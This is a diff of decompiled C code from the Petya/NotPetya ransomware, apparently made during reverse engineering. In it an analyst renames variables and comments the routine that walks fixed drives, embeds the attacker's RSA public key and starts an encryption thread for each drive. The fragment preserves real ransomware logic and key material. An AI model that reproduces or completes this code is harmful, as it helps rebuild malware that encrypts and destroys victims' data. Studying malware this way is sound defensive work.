@@ -976,11 +976,13 @@ LABEL_11:
 }
 
 //----- (681F1EEF) --------------------------------------------------------
-_DWORD *CheckDriveAndPubKey()
+HANDLE  CheckDriveAndPubKey() // returns petya_custom_crypto_struct as well
 {
 	DWORD v0; // ebx
 	signed int v1; // edi
-	_DWORD *result; // eax
+	unsigned int  index; // eax // custom struct probably
+	HANDLE  result; // eax // custom struct probably
+	VOID *buff; // eax // custom struct probably
 	WCHAR RootPathName[2]; // [esp+Ch] [ebp-8h]
 	int v4; // [esp+10h] [ebp-4h]
 
@@ -988,31 +990,31 @@ _DWORD *CheckDriveAndPubKey()
 	v1 = 31;
 	do
 	{
-		result = (1 << v1);
+		index = (1 << v1); //nb of disks
 		if ((1 << v1) & v0)
 		{
 			RootPathName[0] = v1 + 65;
 			RootPathName[1] = 58;
 			v4 = 92;
-			result = GetDriveTypeW(RootPathName);
-			if (result == 3)
+			index = GetDriveTypeW(RootPathName);
+			if (index == DRIVE_FIXED)
 			{
-				result = LocalAlloc(0x40u, 0x20u);
-				if (result)
+				buff = LocalAlloc(LMEM_ZEROINIT, 0x20u); // size of a struct
+				if (buff)
 				{
-					result[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
+					buff[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
 						"hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"
 						"VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"
 						"ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB";
-					result[7] = 0;
-					*result = *RootPathName;
-					result[1] = v4;
-					result = CreateThread(0, 0, CryptoCleanUp, result, 0, 0);
+					buff[7] = 0;
+					*buff = *RootPathName;
+					buff[1] = v4;
+					result = CreateThread(0, 0, CryptoCleanUp, buff, 0, 0);
 				}
 			}
 		}
 		--v1;
-	} while (v1 >= 0);
+	} while (v1 >= 0); // checks each letter from 31 to 0
 	return result;
 }
 
